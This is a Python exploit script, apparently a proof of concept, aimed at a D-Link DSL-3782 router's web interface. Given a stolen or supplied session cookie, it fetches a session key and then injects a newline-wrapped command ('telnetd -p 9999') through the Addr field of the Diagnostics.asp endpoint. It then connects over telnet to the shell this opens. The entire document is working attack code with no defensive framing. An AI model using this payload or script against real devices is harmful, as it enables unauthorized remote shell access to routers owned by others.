import requests
import urllib
from pwn import *
import os
from time import sleep


context.binary = "../_DSL-3782_A1_EU_1.03beta_12132017.bin.extracted/squashfs-root/userfs/bin/cfg_manager"
context.endian = "big"
context.arch = "mips"

server = "192.168.1.1"
main_url = "http://192.168.1.1:80"


def get_session_key(AUTH):
    s = requests.Session()
    s.verify = False
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Cookie": "SESSIONID_AUTH=%s" %AUTH.strip('\n')
        }
    url = main_url + "/cgi-bin/get/New_GUI/get_sessionKey.asp"
    resp = s.get(url,headers=headers,timeout=10)
    sessionKey = resp.text
    print(sessionKey)
    return sessionKey


def exp(sessionKey=None, AUTH=''):
    cmd = "%0autelnetd -p 9999%0a"
    
    s = requests.Session()
    s.verify = False
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Cookie": "SESSIONID_AUTH=%s" %AUTH.strip('\n')
        }
    params = {
        "Type":"t", "sessionKey":urllib.request.unquote(sessionKey),
        "Addr":urllib.request.unquote(cmd),
        "SESSIONID_AUTH": urllib.request.unquote(AUTH)
        }
    url = main_url + "/cgi-bin/New_GUI/Set/Diagnostics.asp"
    resp = s.post(url,data=params,headers=headers,timeout=100000)
    print(resp.text)


if __name__ == '__main__':
    print('\n[*] Connection %r' % main_url)
    print('[*] Getting session key')
    a = input() # input the SESSIONID_AUTH
    sessionKey = get_session_key(a)
    print('[*] Sending payload')
    exp(sessionKey=sessionKey, AUTH=a) 
    print('[*] Running Telnetd Service')
    print('[*] Opening Telnet Connection\n')
    sleep(2)
    os.system('telnet ' + str(server) + ' 9999')
